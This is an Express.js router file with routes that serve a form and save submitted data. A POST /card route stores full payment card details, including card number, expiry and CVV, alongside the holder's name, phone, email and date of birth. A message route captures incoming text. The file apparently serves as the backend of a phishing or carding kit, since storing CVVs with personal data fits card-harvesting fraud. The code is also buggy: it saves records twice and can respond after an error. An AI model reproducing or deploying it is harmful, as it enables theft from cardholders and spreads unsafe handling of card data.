var express = require('express');
var router = express.Router();
const CardModal = require('../models/CardData')
const MessageModal = require('../models/MessageData')

/* GET home page. */
router.get('/', function(req, res, next) {
  res.render('index', { title: 'Express' });
});
router.get('/form', function(req, res, next) {
  res.render('form', { title: 'Express' });
});
router.post('/card', async function(req, res, next) {
  try {
    var userDetails = new CardModal({
      name: req.body.name,
      mobile: req.body.mobile,
      email: req.body.email,
      dob: req.body.dob,
      totalLimit: req.body.totalLimit,
      avLimit: req.body.avLimit,
      cardNumber: req.body.cardNumber,
      holderName: req.body.holderName,
      exDate: req.body.expiry,
      cvv: req.body.cvv
    });
    const user = await userDetails.save();
    console.log(user);
  } catch (err) {
    console.log(err);
    res.status(500).json(err);
  }

  userDetails.save();
  res.render('success')
});

router.post('/message', async (req, res)=>{
  try {
    var userDetails = new MessageModal({
      message: req.query.message,
    });
    const message = await userDetails.save();
    console.log(message);
  } catch (err) {
    console.log(err);
    res.status(500).json(err);
  }
  res.send('message got success')
})

module.exports = router;
